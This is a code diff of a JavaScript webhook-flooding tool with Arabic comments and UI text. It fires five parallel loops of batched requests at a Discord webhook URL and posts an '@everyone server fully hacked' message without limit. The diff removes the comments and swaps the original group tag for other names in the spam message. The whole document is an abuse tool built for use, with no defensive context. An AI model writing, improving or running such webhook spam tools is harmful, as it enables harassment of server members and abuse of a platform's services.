@@ -72,7 +72,7 @@
 let running = false;
 let stopReq = false;
 let count = 0;
-let t1, t2, t3, t4, t5; // 5 timers
+let t1, t2, t3, t4, t5; 
 
 function $(id) { return document.getElementById(id); }
 
@@ -82,7 +82,7 @@ function log(msg) {
     el.scrollTop = el.scrollHeight;
 }
 
-// ====== أسرع إرسال ======
+
 async function shoot(webhook, msg) {
     if (stopReq) return;
     try {
@@ -97,7 +97,7 @@ async function shoot(webhook, msg) {
     } catch(e) {}
 }
 
-// ====== 5 حلقات متوازية — كل حلقة ترمي 10 رسائل بالدفعة ======
+
 function loop1(wh, msg) {
     if (stopReq) return;
     for (let i = 0; i < 10; i++) shoot(wh, msg);
@@ -129,7 +129,7 @@ function start() {
     if (!wh) { alert('حط رابط Webhook'); return; }
     if (running) return;
 
-    const msg = '@everyone تم اختراق السيرفر بالكامل — MRX DESTROYER — @everyone';
+    const msg = '@everyone تم اختراق السيرفر بالكامل — من قبل تراكس هوب  وا الدراك  — @everyone';
 
     running = true;
     stopReq = false;
@@ -140,14 +140,13 @@ function start() {
     
     log('🚀 @everyone سبام غير محدود بدأ!');
 
-    // 5 حلقات تطير مع بعض = أقصى سرعة
+  
     loop1(wh, msg);
     loop2(wh, msg);
     loop3(wh, msg);
     loop4(wh, msg);
     loop5(wh, msg);
 
-    // تحديث العداد
     const ui = setInterval(() => {
         $('count').textContent = count;
         if (stopReq) clearInterval(ui);
